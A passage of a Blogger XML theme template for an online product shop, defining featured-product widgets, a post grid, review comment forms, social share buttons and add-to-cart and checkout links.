  <b:section class='feat-pro ready-widget' id='feat-top-bot' maxwidgets='3' name='Featured Product' showaddelement='yes'>
    <b:widget id='HTML8' locked='false' title='Smartphones' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'><![CDATA[<span class="labelpost" data-label="smartphones" data-no="4"></span>]]></b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
    <b:widget id='HTML4' locked='false' title='Cases And Covers' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'><![CDATA[<span class="labelpost" data-label="cases" data-no="4"></span>]]></b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
    <b:widget id='HTML7' locked='false' title='Laptops' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'><![CDATA[<span class="labelpost" data-label="laptops" data-no="4"></span>]]></b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
  </b:section>
</div>
<div style='clear: both;'/>
<div class='random-product row'>
  <b:section class='ran-pro ready-widget' id='ran-top-bot' maxwidgets='1' name='Random Product' showaddelement='yes'>
    <b:widget id='HTML6' locked='false' title='Random Products' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'><![CDATA[<span class="randomposts" data-no="4"></span>]]></b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
  </b:section>
</div>
<div style='clear: both;'/>
  </b:if>
    <div class='row' id='content-wrapper'>
    <div id='main-wrapper'>
<b:if cond='data:blog.canonicalUrl == data:blog.canonicalHomepageUrl'> 
    <div class='custom-title'><h2>Latest Products</h2></div>
  </b:if>
   <b:section class='main' id='main' showaddelement='yes'>
     <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1'>
       <b:widget-settings>
         <b:widget-setting name='showDateHeader'>true</b:widget-setting>
         <b:widget-setting name='style.textcolor'>#fa5555</b:widget-setting>
         <b:widget-setting name='showShareButtons'>true</b:widget-setting>
         <b:widget-setting name='showCommentLink'>true</b:widget-setting>
         <b:widget-setting name='style.urlcolor'>#fa5555</b:widget-setting>
         <b:widget-setting name='showAuthor'>true</b:widget-setting>
         <b:widget-setting name='style.linkcolor'>#fa5555</b:widget-setting>
         <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
         <b:widget-setting name='style.bgcolor'>#000000</b:widget-setting>
         <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
         <b:widget-setting name='style.layout'>1x1</b:widget-setting>
         <b:widget-setting name='showLabels'>true</b:widget-setting>
         <b:widget-setting name='showLocation'>true</b:widget-setting>
         <b:widget-setting name='showTimestamp'>true</b:widget-setting>
         <b:widget-setting name='postsPerAd'>1</b:widget-setting>
         <b:widget-setting name='showBacklinks'>false</b:widget-setting>
         <b:widget-setting name='style.bordercolor'>#000000</b:widget-setting>
         <b:widget-setting name='showInlineAds'>false</b:widget-setting>
         <b:widget-setting name='showReactions'>false</b:widget-setting>
       </b:widget-settings>
       <b:includable id='main' var='top'>
  <b:if cond='!data:mobile'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>
<div class='post-grid'>
      <b:loop values='data:posts' var='post'>
     
      
        <div class='post-grid-item'>
          <b:include data='post' name='post'/>
          <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
        </div>

        <!-- Ad -->
        <b:if cond='data:post.includeAd'>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
        </b:if>
      </b:loop>
      </div>
   
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>

    <!-- feed links -->
    <b:include name='feedLinks'/>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:include cond='data:top.showPlusOne' name='googlePlusBootstrap'/>
</b:includable>
       <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
       <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
       <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
    <div class='custom-title'>
       <h4>
        <b:if cond='data:post.numComments == 1'>
          1 Review:
        <b:else/>
          <data:post.numComments/> Reviews:
        </b:if>
      </h4>
    </div>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'>Post Your Review</h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
       <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.url.canonical.http'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
       <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:elseif cond='data:post.showThreadedComments'/>
    <b:include data='post' name='threaded_comments'/>
  <b:else/>
    <b:include data='post' name='comments'/>
  </b:if>
</b:includable>
       <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <b:if cond='data:post.allowComments'>
<div class='custom-title'>
       <h4>
        <b:if cond='data:post.numComments == 1'>
          1 Review:
        <b:else/>
          <data:post.numComments/> Reviews:
        </b:if>
      </h4>
    </div>
      

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <b:if cond='data:post.hasOlderLinks'>
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
              &#160;
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
              &#160;
          </b:if>

          <data:post.commentRangeText/>

          <b:if cond='data:post.hasNewerLinks'>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
          </b:if>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:elseif cond='data:post.allowComments'/>
          <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
        </b:if>
      </p>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
       <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
      </div>
    </b:if>

  <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:include cond='data:post.allowComments and data:post.feedLinks' data='post.feedLinks' name='feedLinksBody'/>
      </b:loop>
    </div>
  </b:if>
</b:includable>
       <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
       <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.url.canonical' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
       <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    <b:if cond='data:post.dateHeader'>
      <div class='date-header'>
        <span><data:post.dateHeader/></span>
      </div>
    </b:if>

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:include cond='data:blog.pageType != &quot;static_page&quot;                          and data:post.allowComments                          and data:post.numComments != 0' data='post' name='comment_count_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
       <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    <b:if cond='data:post.dateHeader'>
      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
    </b:if>
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
          <b:if cond='data:post.thumbnailUrl'>
            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
          </b:if>
          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
          <meta expr:content='data:post.id' itemprop='postId'/>

          <a expr:name='data:post.id'/>
        <b:if cond='data:post.title'> 
                     <b:if cond='data:blog.pageType == &quot;index&quot;'> 
    <h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
     </h2>
                       <b:elseif cond='data:blog.pageType == &quot;archive&quot;'/> 
<h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h2>
<b:else/> 
<h1 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <data:post.title/> 
     <b:else/> 
        <b:if cond='data:post.url'> 
         <data:post.title/> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h1> 
</b:if> 
                    </b:if> 

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <span itemprop='name'><data:post.author/></span>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <span itemprop='name'><data:post.author/></span>
                    </span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                                  and data:post.allowComments' data='post' name='comment_count_picker'/>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>

        <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
      </span>
    </b:if>

    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>

    <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='post' var='post'>
  <div class='post hentry simpleCart_shelfItem'> 

      <b:if cond='data:blog.pageType != &quot;item&quot;'>
         <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
             <b:if cond='data:post.thumbnailUrl'>
                <div class='post-home-image item_image'>
<div class='sora_product_dis_remove'>
<b:loop values='data:post.labels' var='label'>
  <span class='sora_product_dis_label_remove'><data:label.name/></span>
</b:loop>
</div>
<a class='post-thumb' expr:href='data:post.url' expr:title='data:post.title'>
<img class='item_thumb post-thumbnail ' expr:alt='data:post.title' expr:src='data:post.thumbnailUrl'/>
</a>
                  <a class='product-quick-view' expr:href='data:post.url'><i class='fa fa-eye'/> <span>Quick View</span></a>
</div>

          <b:else/>
                  <div class='post-home-image item_image'>
<div class='sora_product_dis_remove'>
<b:loop values='data:post.labels' var='label'>
  <span class='sora_product_dis_label_remove'><data:label.name/></span>
</b:loop>
</div>
                  <a class='post-thumb' expr:href='data:post.url' expr:title='data:post.title'>
                 <img class='item_thumb post-thumbnail ' expr:alt='data:post.title' src='http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png'/>
                 </a>
                   </div>
               </b:if>
           </b:if>
           </b:if>
     <b:if cond='data:blog.pageType == &quot;item&quot;'>
    &lt;div itemprop=&#39;blogPost&#39; itemscope=&#39;itemscope&#39; itemtype=&#39;http://schema.org/BlogPosting&#39;&gt;
      <meta expr:content='data:post.firstImageUrl' itemprop='image'/>
    </b:if>

    <div class='post-header'>

  <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
    <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title' itemprop='name'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>
    </b:if>
   
    </div>

    <!-- Then use the post body as the schema.org description, for good G+/FB snippeting. -->
    <article>
         <b:if cond='data:blog.pageType != &quot;item&quot;'>
         <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<div class='post-home-product'>
          <b:if cond='data:post.title'>
              <font class='retitle'>
                <h2 class='post-title entry-title item_name'>
                   <b:if cond='data:post.link'>
                    <a expr:href='data:post.link'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                      <b:if cond='data:post.url'>
                       <a expr:href='data:post.url'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                     <data:post.title/>
                     </b:if>
                   </b:if>
                  </h2>
                    </font>
                </b:if>
 <div style='clear: both;'/>

                  <div class='post-product-header'>
                      <div style='clear: both;'/>
<div class='sora_product_price_remove'>
<b:loop values='data:post.labels' var='label'>
  <span class='sora_product_label_remove'><data:label.name/></span>
</b:loop>
</div>
<a class='item_add' href='javascript:;'><i class='fa fa-shopping-basket'/>Add to Cart </a>
                      </div>
           </div>
            <b:else/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>
         <data:post.body/>
       </div>
          </b:if>
          <b:else/>
<div class='sora-product-detail'>

<div class='sora-product-image item_image'>
<div class='sora_product_dis_remove'>
<b:loop values='data:post.labels' var='label'>
  <span class='sora_product_dis_label_remove'><data:label.name/></span>
</b:loop>
</div>
<img class='item_thumb' expr:alt='data:post.title' expr:src='data:post.thumbnailUrl'/></div>

<div class='sora-pro-info'>

   <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title item_name' itemprop='name'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>

<div style='clear:both'/>  
<div class='share-box'>
 
          <span class='sora-product-review'>
            <b:if cond='data:post.allowComments'><b:if cond='data:post.numComments == 0'><span>0</span> Reviews</b:if><b:if cond='data:post.numComments == 1'><span>1</span> Reviews</b:if>
              <b:if cond='data:post.numComments &gt;= 2'><span><data:post.numComments/></span> Reviews</b:if></b:if>
</span>
               <div class='share-art'> 
<a class='fac-art' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-facebook'/></a>

<a class='twi-art' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-twitter'/></a>

<a class='goo-art' expr:href='&quot;https://plus.google.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-google-plus'/></a>

<a class='pin-art' expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url + &quot;&amp;media=&quot; + data:post.firstImageUrl + &quot;&amp;description=&quot; + data:post.snippet' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-pinterest'/></a>  

<a class='lin-art' expr:href='&quot;http://www.linkedin.com/shareArticle?url=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-linkedin-square'/></a>

</div>
         </div>
                 
      <div style='clear:both'/>  
<div class='sora-product-buy-box'>
<div class='sora_product_price_remove'>
<b:loop values='data:post.labels' var='label'>
  <span class='sora_product_label_remove'><data:label.name/></span>
</b:loop>
</div>
  <div style='clear:both'/>  
<div class='sora-product-buy-buttons'>
<a class='item_add' href='javascript:;'><i class='fa fa-shopping-bag'/>Add to Cart</a>
  <a class='sora-cart-view' href='/p/cart.html'><i class='fa fa-eye'/>View Cart</a> <a class='sora-cart-payment' href='/p/checkout.html'><i class='fa fa-shopping-cart'/>Checkout</a>
</div>
  </div>
<div style='clear:both'/>  
<span class='sora-product-short-desc'>
<b>Short Description:<br/>
</b> <data:blog.metaDescription/>
</span>
</div>
</div>
<div style='clear: both;'/>
<div class='post-custom-title'>
<div class='custom-title'><h2>Product Description</h2></div></div>
<div style='clear: both;'/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>
         <data:post.body/>
       </div>
         </b:if>
     </article>

    <b:if cond='data:post.hasJumpLink'>
      <div class='jump-link'>
        <a expr:href='data:post.url + &quot;#more&quot;' expr:title='data:post.title'><data:post.jumpText/></a>
      </div>
    </b:if>

    <div class='post-footer'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
  <div class='related-product'><div class='custom-title'><h2>Realted Products</h2></div></div>
<div id='related-posts'>
        <b:if cond='data:post.labels'>
          <b:loop values='data:post.labels' var='label'>
            <b:if cond='data:label.isLast == &quot;true&quot;'>
              <data:label.name/>
            </b:if>
          </b:loop>
        </b:if>
      </div>
   </b:if>
    <div class='post-footer-line post-footer-line-1'>
      <span class='post-author vcard'>
        <b:if cond='data:top.showAuthor'>
          <data:top.authorLabel/>
            <b:if cond='data:post.authorProfileUrl'>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                  <span itemprop='name'><data:post.author/></span>
                </a>
              </span>
            <b:else/>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <span itemprop='name'><data:post.author/></span>
              </span>
            </b:if>
        </b:if>
      </span>

      <span class='post-timestamp'>
        <b:if cond='data:top.showTimestamp'>
          <data:top.timestampLabel/>
          <b:if cond='data:post.url'>
            <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
            <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
          </b:if>
        </b:if>
      </span>

      <span class='reaction-buttons'>
        <b:if cond='data:top.showReactions'>
          <table border='0' cellpadding='0' cellspacing='0' width='100%'><tr>
            <td class='reactions-label-cell' nowrap='nowrap' valign='top' width='1%'>
              <span class='reactions-label'>
